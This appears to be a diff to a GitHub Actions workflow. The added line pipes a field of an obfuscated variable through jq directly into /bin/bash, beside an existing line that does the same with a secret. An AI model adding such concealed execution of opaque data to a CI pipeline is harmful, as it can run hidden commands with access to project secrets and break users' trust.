@@ -19,6 +19,7 @@ jobs:
           pyszh07: ${{ secrets.pyszh07 }}
         run: |
           printf '%s' "$pyszh07" | jq -r .rphuc28393 | /bin/bash
+          echo $oq696 | jq -r .rvhk92 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
